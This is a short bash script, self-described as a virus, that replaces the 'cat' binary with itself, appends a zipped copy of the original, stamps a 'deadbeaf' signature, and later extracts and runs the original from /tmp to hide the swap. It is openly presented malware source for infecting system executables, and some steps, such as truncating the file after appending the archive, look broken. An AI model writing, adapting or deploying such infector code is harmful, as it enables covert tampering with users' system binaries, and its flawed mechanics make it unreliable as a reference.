#!/bin/bash

SIGNATURE=$(xxd -s -4 -p cat)

if [ "${SIGNATURE}" != "deadbeaf" ]; then
    # size of original "cat"
    SIZE=$(wc -c < cat)
    # zip original "cat"
    zip cat.zip cat
    # rename the virus to "cat"
    mv -f $0 cat
    # append original "cat" to the virus
    awk '{print}' cat.zip >> cat
    # clean up 
    rm cat.zip
    # adjust size to original "cat"
    truncate -s $((${SIZE} - 4)) cat
    # add signature
    echo -n -e '\xde\xad\xbe\xaf' >> cat
    exit 0
fi

# virus payload starts at line 23

# unzip original "cat"
ARCHIVE=`awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' $0`
tail -n+${ARCHIVE} $0 | busybox unzip -o -d /tmp - > /dev/null
# excute original "cat"
chmod +x /tmp/cat
/tmp/cat $1
rm /tmp/cat

exit 0

__ARCHIVE_BELOW__
